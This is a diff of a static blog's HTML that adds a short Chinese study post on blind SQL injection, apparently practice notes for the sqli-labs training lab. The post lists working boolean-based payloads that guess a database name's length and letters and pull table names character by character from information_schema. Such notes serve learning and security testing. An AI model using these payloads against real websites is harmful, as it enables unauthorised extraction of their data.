@@ -64,6 +64,48 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-5" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/25/page-5/" class="article-date">
+  <time datetime="2020-11-25T12:28:10.000Z" itemprop="datePublished">2020-11-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/25/page-5/">盲注</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>?id=1’ and length(database())=n %23 n从0到无穷大 猜出数据库长度 </p>
+<p>?id=1’ and left(database(),1)&gt;’<strong><em>a</em></strong>‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）</p>
+<ul>
+<li>利用substr() ascii()函数进行尝试</li>
+</ul>
+<p>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <strong>0</strong>,1),<strong><em>1</em></strong>,1))&gt;<strong>100</strong>–+  加黑数字更改 此为ascii码对照数字对应字母 也是和猜库名一样的操作  这猜第一个库的第一个字符   然后一个一个改 猜出第n个库的第n个字符</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/25/page-5/" data-id="ckhxdwgkq0000x0v76f1pa6wz" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-page-4" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/19/page-4/" class="article-date">
@@ -744,6 +786,10 @@ echo "Have a good night!";
       <ul>
         
           <li>
+            <a href="/2020/11/25/page-5/">盲注</a>
+          </li>
+        
+          <li>
             <a href="/2020/11/19/page-4/">sqli-labs</a>
           </li>
         
@@ -757,10 +803,6 @@ echo "Have a good night!";
         
           <li>
             <a href="/2020/11/07/php%20%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/">PHP 超级全局变量</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/05/php%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">php环境搭建</a>
           </li>
         
       </ul>
